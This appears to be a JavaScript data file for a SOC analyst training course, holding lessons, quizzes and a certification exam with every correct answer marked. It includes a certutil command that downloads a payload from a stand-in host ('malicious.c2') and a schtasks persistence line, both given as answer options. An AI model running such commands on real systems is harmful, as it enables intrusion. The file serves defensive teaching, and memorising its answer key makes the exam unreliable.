                { id: 'opt_2_10_d', text: 'A process modifying desktop wallpaper registry keys', is_correct: false }
              ],
              explanation: 'Mimikatz and other memory scrapers must open a handle to lsass.exe with PROCESS_VM_READ and PROCESS_QUERY_INFORMATION permissions.'
            },
            {
              id: 'q_2_11',
              text: 'What is the primary purpose of a Sigma rule in defensive operations?',
              type: 'single_choice',
              points: 1,
              options: [
                { id: 'opt_2_11_a', text: 'A generic, open signature format for log events that converts to SIEM-specific query languages (Splunk, Elastic, QRadar)', is_correct: true },
                { id: 'opt_2_11_b', text: 'A firewall packet filtering syntax', is_correct: false },
                { id: 'opt_2_11_c', text: 'A kernel memory debugging tool', is_correct: false },
                { id: 'opt_2_11_d', text: 'An SSL certificate pinning specification', is_correct: false }
              ],
              explanation: 'Sigma is the generic query standard for log events, bridging the gap between detection ideas and diverse SIEM implementations.'
            },
            {
              id: 'q_2_12',
              text: 'An adversary creates a scheduled task with "schtasks /create /sc daily /tr C:\\\\temp\\\\rev.bat". Which MITRE technique is this?',
              type: 'single_choice',
              points: 1,
              options: [
                { id: 'opt_2_12_a', text: 'Scheduled Task/Job: Scheduled Task (T1053.005)', is_correct: true },
                { id: 'opt_2_12_b', text: 'Boot or Logon Autostart Execution (T1547)', is_correct: false },
                { id: 'opt_2_12_c', text: 'Account Manipulation (T1098)', is_correct: false },
                { id: 'opt_2_12_d', text: 'Hijack Execution Flow (T1574)', is_correct: false }
              ],
              explanation: 'Using the Task Scheduler CLI to maintain recurring execution is classified under T1053.005.'
            },
            {
              id: 'q_2_13',
              text: 'Which event log should be examined to detect suspicious LDAP search filters used for Active Directory reconnaissance (e.g. BloodHound)?',
              type: 'single_choice',
              points: 1,
              options: [
                { id: 'opt_2_13_a', text: 'Directory Service Log (Event ID 1644 for expensive/inefficient searches)', is_correct: true },
                { id: 'opt_2_13_b', text: 'Application Log Event ID 1000', is_correct: false },
                { id: 'opt_2_13_c', text: 'System Log Event ID 7036', is_correct: false },
                { id: 'opt_2_13_d', text: 'Setup Log Event ID 1', is_correct: false }
              ],
              explanation: 'AD Event ID 1644 logs detailed LDAP queries, search scopes, and requesting client IPs on Domain Controllers.'
            },
            {
              id: 'q_2_14',
              text: 'What does an attacker accomplish by abusing DLL Side-Loading (T1574.002)?',
              type: 'single_choice',
              points: 1,
              options: [
                { id: 'opt_2_14_a', text: 'Placing a malicious DLL in the same folder as a trusted, digitally-signed executable so it executes the payload', is_correct: true },
                { id: 'opt_2_14_b', text: 'Overwriting the system kernel with a rootkit', is_correct: false },
                { id: 'opt_2_14_c', text: 'Stealing credentials directly from the Windows SAM file', is_correct: false },
                { id: 'opt_2_14_d', text: 'Intercepting cleartext TLS traffic', is_correct: false }
              ],
              explanation: 'DLL Side-Loading abuses Windows DLL search order to execute malicious code within the context of a legitimate, trusted process.'
            },
            {
              id: 'q_2_15',
              text: 'What is the distinction between North-South and East-West network traffic in defensive monitoring?',
              type: 'single_choice',
              points: 1,
              options: [
                { id: 'opt_2_15_a', text: 'North-South is perimeter traffic (in/out of datacenter); East-West is lateral traffic between internal hosts', is_correct: true },
                { id: 'opt_2_15_b', text: 'North-South is encrypted, East-West is unencrypted', is_correct: false },
                { id: 'opt_2_15_c', text: 'North-South is IPv6, East-West is IPv4', is_correct: false },
                { id: 'opt_2_15_d', text: 'There is no difference in network architecture', is_correct: false }
              ],
              explanation: 'Monitoring East-West traffic is critical for detecting lateral movement, whereas North-South catches ingress exploits and exfiltration.'
            },
            {
              id: 'q_2_16',
              text: 'In a YARA rule, what is the mandatory requirement for the rule to trigger?',
              type: 'single_choice',
              points: 1,
              options: [
                { id: 'opt_2_16_a', text: 'The boolean logic in the "condition" section must evaluate to true', is_correct: true },
                { id: 'opt_2_16_b', text: 'All declared strings in the strings block must be present', is_correct: false },
                { id: 'opt_2_16_c', text: 'The target file size must exceed 100 MB', is_correct: false },
                { id: 'opt_2_16_d', text: 'The file must have an .exe extension', is_correct: false }
              ],
              explanation: 'The condition section dictates the exact boolean criteria under which a YARA match is registered.'
            },
            {
              id: 'q_2_17',
              text: 'What is "DCShadow" in Active Directory attack methodology (T1207)?',
              type: 'single_choice',
              points: 1,
              options: [
                { id: 'opt_2_17_a', text: 'Registering a rogue Domain Controller to inject replication changes directly into Active Directory', is_correct: true },
                { id: 'opt_2_17_b', text: 'Deleting all volume shadow copies on the DC', is_correct: false },
                { id: 'opt_2_17_c', text: 'Shutting down the primary domain controller via RPC', is_correct: false },
                { id: 'opt_2_17_d', text: 'Stealing the NTDS.dit file over SMB', is_correct: false }
              ],
              explanation: 'DCShadow temporarily registers a workstation as a DC via RPC replication to push malicious AD changes without triggering standard event logs.'
            },
            {
              id: 'q_2_18',
              text: 'When analyzing a Linux binary, finding "ptrace(PTRACE_TRACEME, 0, 1, 0)" is a common sign of what technique?',
              type: 'single_choice',
              points: 1,
              options: [
                { id: 'opt_2_18_a', text: 'Anti-debugging / Anti-analysis (Evasion T1622)', is_correct: true },
                { id: 'opt_2_18_b', text: 'Local privilege escalation via kernel exploit', is_correct: false },
                { id: 'opt_2_18_c', text: 'Memory-mapped file I/O acceleration', is_correct: false },
                { id: 'opt_2_18_d', text: 'Network socket multiplexing', is_correct: false }
              ],
              explanation: 'PTRACE_TRACEME fails if a process is already being debugged by gdb or strace, allowing the malware to terminate itself.'
            },
            {
              id: 'q_2_19',
              text: 'Which Windows event log ID captures the full text of executed script blocks when PowerShell ScriptBlock Logging is active?',
              type: 'single_choice',
              points: 1,
              options: [
                { id: 'opt_2_19_a', text: 'Event ID 4104 (Microsoft-Windows-PowerShell/Operational)', is_correct: true },
                { id: 'opt_2_19_b', text: 'Event ID 4624 (Security)', is_correct: false },
                { id: 'opt_2_19_c', text: 'Event ID 1102 (The audit log was cleared)', is_correct: false },
                { id: 'opt_2_19_d', text: 'Event ID 7045 (A new service was installed)', is_correct: false }
              ],
              explanation: 'Event ID 4104 reconstructs and logs the complete script code, even if it was executed using obfuscation or reflection.'
            },
            {
              id: 'q_2_20',
              text: 'According to David Bianco\'s "Pyramid of Pain", which indicator of compromise is the "Toughest" for an adversary to change when detected?',
              type: 'single_choice',
              points: 1,
              options: [
                { id: 'opt_2_20_a', text: 'TTPs (Tactics, Techniques, and Procedures)', is_correct: true },
                { id: 'opt_2_20_b', text: 'Hash Values', is_correct: false },
                { id: 'opt_2_20_c', text: 'IP Addresses', is_correct: false },
                { id: 'opt_2_20_d', text: 'Domain Names', is_correct: false }
              ],
              explanation: 'TTPs sit at the apex of the pyramid; changing fundamental attack behaviors requires adversaries to retrain operators and re-engineer tools.'
            }
          ]
        }
      },
      {
        id: 'mod_3',
        title: 'Module 3: Containment, Eradication & Post-Incident Forensics',
        order: 3,
        lessons: [
          {
            id: 'les_3_1',
            title: '3.1 Containment Strategies: Host Isolation vs Network Segmentation',
            duration: '26 mins',
            is_mandatory: true,
            type: 'text_and_video',
            summary: 'Executing immediate quarantine without severing EDR telemetry or forensic remote shells.',
            content: `### Safe Host Isolation

When a ransomware infection or beaconing C2 channel is verified, speed of containment dictates enterprise survival.

#### Network Quarantine via EDR
Never simply rip out the Ethernet cable if you can avoid it! Removing the connection may prevent remote memory acquisition and may trigger anti-analysis failsafes embedded in modern ransomware.

Instead, execute **EDR Network Isolation**:
- Cuts all inbound and outbound traffic *except* the secure agent connection to the EDR cloud management console.
- Allows analysts to run live forensic memory dumps and pull Master File Table ($MFT) snapshots remotely.`,
            resources: [
              { name: 'Host Isolation Checklist', size: '420 KB' }
            ]
          },
          {
            id: 'les_3_2',
            title: '3.2 Evidence Preservation & Chain of Custody',
            duration: '32 mins',
            is_mandatory: true,
            type: 'text_and_video',
            summary: 'Order of Volatility, cryptographic hashing (SHA256), and legal defensibility.',
            content: `### Order of Volatility (RFC 3227)

Evidence must be collected starting from the most volatile to the least volatile:
1. **Registers, cache** (CPU state)
2. **Routing table, ARP cache, process table, kernel statistics, memory (RAM)**
3. **Temporary file systems / swap space**
4. **Disk (Non-volatile storage)**
5. **Remote logging and network monitoring data**
6. **Physical configuration, network topology**
7. **Archival media (Backups, tapes)**

\`\`\`bash
# Compute SHA256 forensic image hash for chain of custody
sha256sum /mnt/forensics/workstation_04_ram.raw > workstation_04_ram.sha256
\`\`\``,
            resources: [
              { name: 'Evidence Chain of Custody Form (PDF)', size: '310 KB' }
            ]
          }
        ],
        quiz: {
          
          id: 'quiz_mod_3',
          title: 'Module 3 Evaluation: Incident Containment & Forensics',
          passing_score: 80,
          duration_minutes: 20,
          total_questions: 20,
          token_bounty: 150,
          questions: [
            {
              id: 'q_3_1',
              text: 'According to RFC 3227 Order of Volatility, which data source should be acquired FIRST during a forensic investigation?',
              type: 'single_choice',
              points: 1,
              options: [
                { id: 'opt_3_1_a', text: 'Registers and processor cache', is_correct: true },
                { id: 'opt_3_1_b', text: 'Hard disk drive contents', is_correct: false },
                { id: 'opt_3_1_c', text: 'Network cable wiring logs', is_correct: false },
                { id: 'opt_3_1_d', text: 'Optical disc backups', is_correct: false }
              ],
              explanation: 'Registers and cache memory change in nanoseconds and vanish immediately upon power disruption.'
            },
            {
              id: 'q_3_2',
              text: 'What is the main advantage of EDR Network Isolation over pulling physical network cables during an active breach?',
              type: 'single_choice',
              points: 1,
              options: [
                { id: 'opt_3_2_a', text: 'It maintains a secure channel for remote memory capture and triage while cutting all other inbound/outbound traffic', is_correct: true },
                { id: 'opt_3_2_b', text: 'It speeds up Internet download performance', is_correct: false },
                { id: 'opt_3_2_c', text: 'It automatically formats the compromised machine', is_correct: false },
                { id: 'opt_3_2_d', text: 'It alerts the adversary that they have been discovered', is_correct: false }
              ],
              explanation: 'EDR isolation prevents adversary movement while keeping management tunnels open for volatile memory acquisition and forensic collection.'
            },
            {
              id: 'q_3_3',
              text: 'When creating a forensic bit-stream disk image, which hashing algorithms should be calculated to guarantee evidentiary chain of custody?',
              type: 'single_choice',
              points: 1,
              options: [
                { id: 'opt_3_3_a', text: 'Cryptographic hashes such as SHA-256 and MD5 computed before and after acquisition', is_correct: true },
                { id: 'opt_3_3_b', text: 'A simple CRC32 checksum', is_correct: false },
                { id: 'opt_3_3_c', text: 'Word count of the drive', is_correct: false },
                { id: 'opt_3_3_d', text: 'Base64 encoding length', is_correct: false }
              ],
              explanation: 'Forensic integrity mandates cryptographic verification (e.g. SHA-256) matching the original source media and the forensic clone.'
            },
            {
              id: 'q_3_4',
              text: 'What information is stored in the Windows Master File Table ($MFT) that is invaluable to forensic examiners?',
              type: 'single_choice',
              points: 1,
              options: [
                { id: 'opt_3_4_a', text: 'File metadata, record timestamps ($STANDARD_INFORMATION & $FILE_NAME), file size, and cluster allocations', is_correct: true },
                { id: 'opt_3_4_b', text: 'Plaintext passwords of all logged-on users', is_correct: false },
                { id: 'opt_3_4_c', text: 'Raw packet captures of Wi-Fi traffic', is_correct: false },
                { id: 'opt_3_4_d', text: 'BIOS boot sequences', is_correct: false }
              ],
              explanation: 'The $MFT tracks every file and folder on an NTFS volume, including 8 distinct timestamps per entry to detect timestomping.'
            },
            {
              id: 'q_3_5',
              text: 'In memory forensics, what is the significance of the "VAD" (Virtual Address Descriptor) tree?',
              type: 'single_choice',
              points: 1,
              options: [
                { id: 'opt_3_5_a', text: 'It tracks the allocated memory ranges and execution permissions (PAGE_EXECUTE_READWRITE) for each process', is_correct: true },
                { id: 'opt_3_5_b', text: 'It measures CPU thermal temperatures', is_correct: false },
                { id: 'opt_3_5_c', text: 'It logs domain controller replication intervals', is_correct: false },
                { id: 'opt_3_5_d', text: 'It encrypts the swap file on disk', is_correct: false }
              ],
              explanation: 'Forensic tools like Volatility examine the VAD tree (e.g. malfind plugin) to find injected code in memory allocations with RWX permissions.'
            },
            {
              id: 'q_3_6',
              text: 'Which forensic artifact records application execution history along with run counts, volume GUIDs, and last execution timestamps on Windows?',
              type: 'single_choice',
              points: 1,
              options: [
                { id: 'opt_3_6_a', text: 'Windows Prefetch files (.pf)', is_correct: true },
                { id: 'opt_3_6_b', text: 'hosts.txt file', is_correct: false },
                { id: 'opt_3_6_c', text: 'desktop.ini', is_correct: false },
                { id: 'opt_3_6_d', text: 'ntuser.dat icon cache', is_correct: false }
              ],
              explanation: 'Prefetch proves execution of a binary on a specific date, providing run count and files accessed within the first 10 seconds of launch.'
            },
            {
              id: 'q_3_7',
              text: 'When examining Linux systems for persistence, which directory contains cron configurations that should always be inspected?',
              type: 'single_choice',
              points: 1,
              options: [
                { id: 'opt_3_7_a', text: '/etc/cron* and /var/spool/cron/crontabs/', is_correct: true },
                { id: 'opt_3_7_b', text: '/proc/cpuinfo', is_correct: false },
                { id: 'opt_3_7_c', text: '/usr/share/doc', is_correct: false },
                { id: 'opt_3_7_d', text: '/boot/grub/', is_correct: false }
              ],
              explanation: 'Cron tabs and directories (/etc/cron.d, /etc/cron.hourly, /var/spool/cron) are common persistence locations for automated tasks.'
            },
            {
              id: 'q_3_8',
              text: 'What is the primary objective during the Eradication phase of NIST SP 800-61r2?',
              type: 'single_choice',
              points: 1,
              options: [
                { id: 'opt_3_8_a', text: 'Eliminating all components of the incident (malware, compromised accounts, backdoors) across all systems', is_correct: true },
                { id: 'opt_3_8_b', text: 'Contacting news media about the security incident', is_correct: false },
                { id: 'opt_3_8_c', text: 'Restoring from backup without identifying root cause', is_correct: false },
                { id: 'opt_3_8_d', text: 'Writing the final lessons learned document', is_correct: false }
              ],
              explanation: 'Eradication removes all malicious footprints, closes vulnerabilities exploited, and resets compromised user credentials.'
            },
            {
              id: 'q_3_9',
              text: 'What does the presence of a "Zone.Identifier" alternate data stream on a downloaded Windows file indicate?',
              type: 'single_choice',
              points: 1,
              options: [
                { id: 'opt_3_9_a', text: 'The Mark-of-the-Web (MOTW) indicating the file was downloaded from the Internet zone (ZoneId=3)', is_correct: true },
                { id: 'opt_3_9_b', text: 'The file has been encrypted by BitLocker', is_correct: false },
                { id: 'opt_3_9_c', text: 'The file was created by Microsoft Word in safe mode', is_correct: false },
                { id: 'opt_3_9_d', text: 'The file is an administrative driver', is_correct: false }
              ],
              explanation: 'Zone.Identifier is appended by browsers to trigger SmartScreen and Office Protected View when executing web-originating files.'
            },
            {
              id: 'q_3_10',
              text: 'In incident response, why is changing enterprise administrative passwords prematurely sometimes dangerous before full containment?',
              type: 'single_choice',
              points: 1,
              options: [
                { id: 'opt_3_10_a', text: 'It can tip off the adversary, causing them to trigger destructive wiper payloads or deploy deeper backup backdoors', is_correct: true },
                { id: 'opt_3_10_b', text: 'Password changes delete the event logs', is_correct: false },
                { id: 'opt_3_10_c', text: 'It shuts down the domain controllers immediately', is_correct: false },
                { id: 'opt_3_10_d', text: 'Kerberos tickets become permanent', is_correct: false }
              ],
              explanation: 'Premature containment actions without complete visibility can prompt the adversary to accelerate their objective or go into sleeper mode.'
            },
            {
              id: 'q_3_11',
              text: 'Which Volatility plugin is used to detect unlinked or hidden processes that may indicate rootkit DKOM presence?',
              type: 'single_choice',
              points: 1,
              options: [
                { id: 'opt_3_11_a', text: 'psxview', is_correct: true },
                { id: 'opt_3_11_b', text: 'netstat', is_correct: false },
                { id: 'opt_3_11_c', text: 'iehistory', is_correct: false },
                { id: 'opt_3_11_d', text: 'hivedump', is_correct: false }
              ],
              explanation: 'psxview cross-references multiple process tracking sources (ActiveProcessLinks, CSRSS, threads, PSPCID) to spot discrepancies.'
            },
            {
              id: 'q_3_12',
              text: 'What is "Timestomping" (MITRE ATT&CK T1070.006)?',
              type: 'single_choice',
              points: 1,
              options: [
                { id: 'opt_3_12_a', text: 'Modifying the file creation, modification, or access timestamps to blend in with legitimate system files', is_correct: true },
                { id: 'opt_3_12_b', text: 'Syncing system clocks with a rogue NTP server', is_correct: false },
                { id: 'opt_3_12_c', text: 'Overclocking CPU cycles during brute force attacks', is_correct: false },
                { id: 'opt_3_12_d', text: 'Deliberately creating race conditions in network routers', is_correct: false }
              ],
              explanation: 'Timestomping alters $STANDARD_INFORMATION timestamps on NTFS to fool basic timeline analyses.'
            },
            {
              id: 'q_3_13',
              text: 'What critical forensic intelligence does the Windows Shimcache (AppCompatCache) provide to investigators?',
              type: 'single_choice',
              points: 1,
              options: [
                { id: 'opt_3_13_a', text: 'Evidence of binary existence and execution path, file size, and last modified date even if the binary was deleted', is_correct: true },
                { id: 'opt_3_13_b', text: 'Direct packet captures of VoIP calls', is_correct: false },
                { id: 'opt_3_13_c', text: 'Encrypted BitLocker recovery keys', is_correct: false },
                { id: 'opt_3_13_d', text: 'Browser bookmarks and cookies', is_correct: false }
              ],
              explanation: 'Shimcache tracks binary execution metadata in the SYSTEM registry hive and is preserved even when adversaries delete the payload from disk.'
            },
            {
              id: 'q_3_14',
              text: 'When acquiring volatile RAM, why should investigators write the memory dump to external media rather than the local hard drive?',
              type: 'single_choice',
              points: 1,
              options: [
                { id: 'opt_3_14_a', text: 'To avoid overwriting unallocated disk clusters, deleted files, and temporary artifacts in swap space', is_correct: true },
                { id: 'opt_3_14_b', text: 'Because Windows does not allow saving files locally during investigations', is_correct: false },
                { id: 'opt_3_14_c', text: 'RAM dumps can only exist on FAT32 flash drives', is_correct: false },
                { id: 'opt_3_14_d', text: 'It encrypts the hard drive automatically', is_correct: false }
              ],
              explanation: 'Minimizing footprint on the target system is foundational to digital evidence preservation.'
            },
            {
              id: 'q_3_15',
              text: 'What is the role of a hardware write blocker during dead-box forensic disk acquisition?',
              type: 'single_choice',
              points: 1,
              options: [
                { id: 'opt_3_15_a', text: 'Preventing the operating system from sending any write commands to the evidence disk during copying', is_correct: true },
                { id: 'opt_3_15_b', text: 'Speeding up USB 3.0 data transfer rates', is_correct: false },
                { id: 'opt_3_15_c', text: 'Decrypting BitLocker partitions without a password', is_correct: false },
                { id: 'opt_3_15_d', text: 'Formatting corrupted sectors on old drives', is_correct: false }
              ],
              explanation: 'A write blocker intercepts write requests at the hardware layer, ensuring absolute read-only preservation of evidence.'
            },
            {
              id: 'q_3_16',
              text: 'In email header analysis, which "Received:" header is typically the most trustworthy for identifying the sender\'s true origin IP?',
              type: 'single_choice',
              points: 1,
              options: [
                { id: 'opt_3_16_a', text: 'The bottom-most "Received:" header added by the first trusted MTA (Mail Transfer Agent)', is_correct: true },
                { id: 'opt_3_16_b', text: 'The "From:" display header', is_correct: false },
                { id: 'opt_3_16_c', text: 'The "Subject:" header line', is_correct: false },
                { id: 'opt_3_16_d', text: 'The top-most "Received:" line added by your own mail gateway', is_correct: false }
              ],
              explanation: 'Mail headers are appended from bottom to top; the bottom-most line recorded by a legitimate receiving server identifies the initial ingress IP.'
            },
            {
              id: 'q_3_17',
              text: 'Which Windows Registry key records device connection history and serial numbers for plugged-in USB storage devices?',
              type: 'single_choice',
              points: 1,
              options: [
                { id: 'opt_3_17_a', text: 'SYSTEM\\\\CurrentControlSet\\\\Enum\\\\USBSTOR', is_correct: true },
                { id: 'opt_3_17_b', text: 'SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run', is_correct: false },
                { id: 'opt_3_17_c', text: 'SAM\\\\Domains\\\\Account\\\\Users', is_correct: false },
                { id: 'opt_3_17_d', text: 'SECURITY\\\\Policy\\\\Secrets', is_correct: false }
              ],
              explanation: 'USBSTOR tracks vendor name, product model, revision, and unique hardware serial numbers for every mass storage device ever mounted.'
            },
            {
              id: 'q_3_18',
              text: 'What does "File Carving" mean in digital forensic recovery?',
              type: 'single_choice',
              points: 1,
              options: [
                { id: 'opt_3_18_a', text: 'Reconstructing files from raw disk sectors based on file headers and footers without relying on file system metadata', is_correct: true },
                { id: 'opt_3_18_b', text: 'Securely wiping deleted data using DoD 5220.22-M algorithms', is_correct: false },
                { id: 'opt_3_18_c', text: 'Splitting large log files into 100 MB chunks', is_correct: false },
                { id: 'opt_3_18_d', text: 'Extracting passwords from memory dumps', is_correct: false }
              ],
              explanation: 'Carving recovers deleted or orphaned files directly from unallocated space using magic byte signatures (e.g. %PDF, FF D8 FF).'
            },
            {
              id: 'q_3_19',
              text: 'When investigating a suspected ransomware incident, why should responders avoid immediately rebooting the affected machine?',
              type: 'single_choice',
              points: 1,
              options: [
                { id: 'opt_3_19_a', text: 'Volatile encryption keys held in RAM will be destroyed, eliminating the chance of memory-based file decryption', is_correct: true },
                { id: 'opt_3_19_b', text: 'Rebooting instantly speeds up file encryption by 500%', is_correct: false },
                { id: 'opt_3_19_c', text: 'Windows licenses are revoked upon unexpected power down', is_correct: false },
                { id: 'opt_3_19_d', text: 'The motherboard BIOS will become corrupted', is_correct: false }
              ],
              explanation: 'Ransomware often holds symmetric session keys in RAM during encryption passes; pulling power destroys that volatile data forever.'
            },
            {
              id: 'q_3_20',
              text: 'In NIST SP 800-61r2, what is the primary purpose of the "Post-Incident Activity" (Lessons Learned) phase?',
              type: 'single_choice',
              points: 1,
              options: [
                { id: 'opt_3_20_a', text: 'Analyzing how the incident occurred, improving preventative controls, and updating standard operating procedures to prevent recurrence', is_correct: true },
                { id: 'opt_3_20_b', text: 'Assigning personal blame to employees', is_correct: false },
                { id: 'opt_3_20_c', text: 'Calculating the total IT department budget increase', is_correct: false },
                { id: 'opt_3_20_d', text: 'Filing patent applications on defensive techniques', is_correct: false }
              ],
              explanation: 'Lessons Learned meetings evaluate response efficacy, root causes, detection gaps, and update playbooks for future resilience.'
            }
          ]
        }
      }
    ],
    final_assessment: {
      id: 'exam_soc_cert',
      title: 'RedKross Certified SOC Analyst (RCSA) — Final Comprehensive Examination',
      passing_score: 80, // PRD strict 80% passing threshold
      duration_minutes: 60,
      total_questions: 50,
      credential_title: 'RedKross Certified SOC Analyst (RCSA)',
      credential_type: 'Certification',
      skills_validated: [
        'SOC Operations & Log Ingestion',
        'MITRE ATT&CK Behavioral Mapping',
        'SIEM Correlation & Threat Triage',
        'Digital Forensics & Order of Volatility',
        'Incident Containment & Evidence Defensibility'
      ],
      questions: [
          {
            id: 'fe_1',
            text: 'During a memory forensics investigation of a compromised Domain Controller, you observe code injection into lsass.exe. Which specific Windows API hook is most commonly weaponized by credential-siphoning tools to extract plaintext credentials from Wdigest memory?',
            type: 'single_choice',
            points: 2,
            options: [
              { id: 'f_opt_1_a', text: 'Secur32!LsaEnumerateLogonSessions and ReadProcessMemory targeting the Kerberos/Wdigest SSP DLLs', is_correct: true },
              { id: 'f_opt_1_b', text: 'NtQuerySystemInformation hooked to intercept PID enumeration across the session', is_correct: false },
              { id: 'f_opt_1_c', text: 'SetWindowsHookEx targeting WH_KEYBOARD_LL in user32.dll for keystroke capture', is_correct: false },
              { id: 'f_opt_1_d', text: 'VirtualProtectEx to mark all physical RAM pages as executable and writable', is_correct: false }
            ],
            explanation: 'Mimikatz accesses LSASS process memory via OpenProcess with PROCESS_VM_READ and invokes LsaEnumerateLogonSessions to traverse live Security Support Provider (SSP) credential pools.'
          },
          {
            id: 'fe_2',
            text: 'Which Windows Security Event ID specifically signifies the installation of a new Windows Service (MITRE ATT&CK T1543.003)?',
            type: 'single_choice',
            points: 2,
            options: [
              { id: 'f_opt_2_a', text: 'Event ID 1102 (The audit log was cleared)', is_correct: false },
              { id: 'f_opt_2_b', text: 'Event ID 7045 in System log or Event ID 4697 in Security log', is_correct: true },
              { id: 'f_opt_2_c', text: 'Event ID 4624 (Successful network logon)', is_correct: false },
              { id: 'f_opt_2_d', text: 'Event ID 4720 (A user account was created)', is_correct: false }
            ],
            explanation: 'Event ID 7045 (System log via Service Control Manager) and Event ID 4697 (Security log when enabled in audit policy) explicitly record service installation events.'
          },
          {
            id: 'fe_3',
            text: 'An adversary executes a Golden Ticket attack. Which domain-wide secret is required to forge this Kerberos Ticket Granting Ticket (TGT)?',
            type: 'single_choice',
            points: 2,
            options: [
              { id: 'f_opt_3_a', text: 'The Domain Administrator\'s plaintext password', is_correct: false },
              { id: 'f_opt_3_b', text: 'The public key certificate of the root Active Directory Certificate Services (AD CS)', is_correct: false },
              { id: 'f_opt_3_c', text: 'The domain krbtgt account\'s NTLM hash or AES-256 master key', is_correct: true },
              { id: 'f_opt_3_d', text: 'The local machine SID of the target workstation', is_correct: false }
            ],
            explanation: 'Golden Tickets require the krbtgt account key (NTLM hash or AES128/256 key) to sign and encrypt Kerberos TGTs with arbitrary group memberships and lifetimes.'
          },
          {
            id: 'fe_4',
            text: 'In Wireshark, which display filter isolates DNS tunneling beacons characterized by unusually long subdomain queries transmitting encoded base64/hex data?',
            type: 'single_choice',
            points: 2,
            options: [
              { id: 'f_opt_4_a', text: 'ip.proto == 6 && tcp.port == 53', is_correct: false },
              { id: 'f_opt_4_b', text: 'udp.port == 53 && frame.len < 64', is_correct: false },
              { id: 'f_opt_4_c', text: 'dns.count.answers > 10', is_correct: false },
              { id: 'f_opt_4_d', text: 'dns && dns.flags.response == 0 && dns.qry.name.len > 50', is_correct: true }
            ],
            explanation: 'DNS exfiltration and C2 tunneling encode data within DNS request labels (subdomains), resulting in high query name length (dns.qry.name.len > 50) and TXT/A record anomalies.'
          },
          {
            id: 'fe_5',
            text: 'What is the primary forensic difference between Kerberoasting and AS-REP Roasting in Active Directory environments?',
            type: 'single_choice',
            points: 2,
            options: [
              { id: 'f_opt_5_a', text: 'Kerberoasting requests TGS tickets for SPN accounts; AS-REP Roasting targets accounts where \'Do not require Kerberos preauthentication\' is configured', is_correct: true },
              { id: 'f_opt_5_b', text: 'Kerberoasting requires Domain Admin privileges, whereas AS-REP Roasting requires no credentials at all', is_correct: false },
              { id: 'f_opt_5_c', text: 'Kerberoasting only works against Linux servers joining AD; AS-REP Roasting only targets Azure AD', is_correct: false },
              { id: 'f_opt_5_d', text: 'Kerberoasting decrypts the NTDS.dit database directly over SMB port 445', is_correct: false }
            ],
            explanation: 'Kerberoasting abuses valid domain credentials to request Service Tickets (TGS) for accounts with ServicePrincipalNames. AS-REP Roasting does not need valid credentials if DONT_REQ_PREAUTH is set.'
          },
          {
            id: 'fe_6',
            text: 'You suspect an adversary used Process Hollowing (T1055.012). Which sequence of native Windows API calls is indicative of this technique?',
            type: 'single_choice',
            points: 2,
            options: [
              { id: 'f_opt_6_a', text: 'CreateFile -> ReadFile -> WriteFile -> CloseHandle', is_correct: false },
              { id: 'f_opt_6_b', text: 'CreateProcess(CREATE_SUSPENDED) -> NtUnmapViewOfSection -> VirtualAllocEx -> WriteProcessMemory -> SetThreadContext -> ResumeThread', is_correct: true },
              { id: 'f_opt_6_c', text: 'OpenProcess -> VirtualAllocEx -> QueueUserAPC -> SleepEx', is_correct: false },
              { id: 'f_opt_6_d', text: 'LoadLibraryA -> GetProcAddress -> CreateRemoteThread', is_correct: false }
            ],
            explanation: 'Process Hollowing spawns a legitimate binary suspended, unmaps its original executable image from memory, allocates and writes malicious shellcode, updates thread context, and resumes execution.'
          },
          {
            id: 'fe_7',
            text: 'When investigating a suspected Ransomware execution on Linux, which volatile artifact provides immediate evidence of open network sockets and active unlinked file descriptors?',
            type: 'single_choice',
            points: 2,
            options: [
              { id: 'f_opt_7_a', text: '/etc/resolv.conf and /var/log/lastlog', is_correct: false },
              { id: 'f_opt_7_b', text: '/etc/shadow and /etc/passwd', is_correct: false },
              { id: 'f_opt_7_c', text: '/proc/<pid>/fd/ and /proc/<pid>/net/', is_correct: true },
              { id: 'f_opt_7_d', text: '/home/*/.bash_history only', is_correct: false }
            ],
            explanation: 'The Linux procfs filesystem (/proc/<pid>/fd/) exposes live file descriptors even for deleted binaries and open socket connections (/proc/<pid>/net/).'
          },
          {
            id: 'fe_8',
            text: 'Under the Order of Volatility (RFC 3227), which source of digital evidence must be acquired FIRST during live host triage?',
            type: 'single_choice',
            points: 2,
            options: [
              { id: 'f_opt_8_a', text: 'Hard drive raw block images (dd / E01 of /dev/sda)', is_correct: false },
              { id: 'f_opt_8_b', text: 'Archival backup tapes and optical media', is_correct: false },
              { id: 'f_opt_8_c', text: 'Remote syslog server historical indices', is_correct: false },
              { id: 'f_opt_8_d', text: 'CPU cache, registers, and Physical RAM', is_correct: true }
            ],
            explanation: 'RFC 3227 Order of Volatility: 1. CPU registers/cache; 2. Routing tables, ARP cache, process table, kernel stats, RAM; 3. Temporary file systems; 4. Disk; 5. Remote logging; 6. Backups.'
          },
          {
            id: 'fe_9',
            text: 'Which Zeek (Bro) log file specifically records all SSL/TLS handshakes, JA3/JA3S client fingerprints, and negotiated cipher suites?',
            type: 'single_choice',
            points: 2,
            options: [
              { id: 'f_opt_9_a', text: 'ssl.log', is_correct: true },
              { id: 'f_opt_9_b', text: 'conn.log', is_correct: false },
              { id: 'f_opt_9_c', text: 'dns.log', is_correct: false },
              { id: 'f_opt_9_d', text: 'http.log', is_correct: false }
            ],
            explanation: 'Zeek ssl.log records TLS certificate exchanges, JA3 client fingerprints, server names (SNI), and handshake validation status.'
          },
          {
            id: 'fe_10',
            text: 'An attacker uses Living off the Land Binaries (LOLBINs) to download a payload using certutil.exe. Which command syntax exemplifies this behavior?',
            type: 'single_choice',
            points: 2,
            options: [
              { id: 'f_opt_10_a', text: 'certutil.exe -dump -v C:\\certs\\root.crt', is_correct: false },
              { id: 'f_opt_10_b', text: 'certutil.exe -urlcache -split -f http://malicious.c2/stage2.exe C:\\ProgramData\\payload.exe', is_correct: true },
              { id: 'f_opt_10_c', text: 'certutil.exe -verify -silent C:\\Windows\\System32\\ntoskrnl.exe', is_correct: false },
              { id: 'f_opt_10_d', text: 'certutil.exe -backupkey C:\\backup', is_correct: false }
            ],
            explanation: 'certutil -urlcache -split -f forces certutil to retrieve a remote URL and store it locally, bypassing naïve application execution filters.'
          },
          {
            id: 'fe_11',
            text: 'Which MITRE ATT&CK Enterprise Matrix tactic describes the adversary\'s attempt to maintain their foothold across system reboots and credential cycles?',
            type: 'single_choice',
            points: 2,
            options: [
              { id: 'f_opt_11_a', text: 'Defense Evasion (TA0005)', is_correct: false },
